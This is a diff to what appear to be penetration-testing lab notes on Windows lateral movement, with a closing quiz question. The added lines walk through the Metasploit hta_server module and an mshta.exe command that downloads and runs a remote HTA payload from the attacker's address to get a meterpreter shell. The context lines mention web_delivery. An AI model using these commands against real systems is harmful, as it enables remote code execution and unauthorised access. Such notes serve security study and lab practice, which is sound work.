@@ -9,6 +9,16 @@ msf5> search web_delivery
 copy that code and paste that in other shell like >  C:\Windows\system32: >
 
 You got a meterpreter shell
+
+You can also use windows/misc/hta_server
+---------------------------------------
+msf5> use windows/misc/hta_server
+    > set LHOST 
+    > exploit
+http://10.10.22.3:8080/NhSSuu25.hta
+
+C:\Windows\System32 > mshta.exe http://10.10.22.3:8080/NhSSuu25.hta
+
 _____________________________________________________________________________________________________________________________________________________________________
 Which of the following is a common technique used to move laterally in a Windows environment? > Creating new services to execute code on remote systems.
 
